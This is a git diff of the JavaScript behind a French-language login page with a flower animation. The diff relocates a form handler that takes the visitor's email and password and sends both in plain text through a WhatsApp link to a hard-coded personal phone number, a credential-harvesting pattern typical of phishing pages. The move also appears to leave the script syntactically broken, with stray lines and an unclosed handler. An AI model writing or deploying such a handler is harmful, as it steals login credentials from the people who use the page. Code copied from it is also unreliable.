@@ -1,25 +1,5 @@
 // Flower emojis for animation
 const flowers = ['🌹', '🌺', '🌸', '🌼', '🌻', '💐', '🌷'];
-// Handle form submission
-document.getElementById('loginForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
-
-  const email = document.getElementById('email').value.trim();
-  const password = document.getElementById('password').value.trim(); // ton champ code
-  const whatsappConsent = document.getElementById('whatsappConsent').checked;
-
-  if (!email || ! password) {
-    alert('Veuillez remplir tous les champs');
-    return;
-  }
-
-  // Envoi sur WhatsApp
-  const message = `*📥 ACCÈS SALLE*\n\n*Email:* ${email}\n*password 🔑 :* ${password}\n*Date:* ${new Date().toLocaleString('fr-FR')}`;
-  const monWhatsApp = '243972055373';
-  const whatsappUrl = `https://wa.me/${monWhatsApp}?text=${encodeURIComponent(message)}`;
-  
-  window.open(whatsappUrl, '_blank');
-
   // Start flower animation
   createFlowerAnimation();
 
@@ -92,6 +72,26 @@ document.addEventListener('click', (e) => {
         closeModal();
     }
 });
+
+// Handle form submission
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value.trim(); // ton champ code
+  const whatsappConsent = document.getElementById('whatsappConsent').checked;
+
+  if (!email || ! password) {
+    alert('Veuillez remplir tous les champs');
+    return;
+  }
+
+  // Envoi sur WhatsApp
+  const message = `*📥 ACCÈS SALLE*\n\n*Email:* ${email}\n*password 🔑 :* ${password}\n*Date:* ${new Date().toLocaleString('fr-FR')}`;
+  const monWhatsApp = '243972055373';
+  const whatsappUrl = `https://wa.me/${monWhatsApp}?text=${encodeURIComponent(message)}`;
+  
+  window.open(whatsappUrl, '_blank');
 
 // Send WhatsApp notification (Backend integration)
 async function sendWhatsAppNotification(email) {
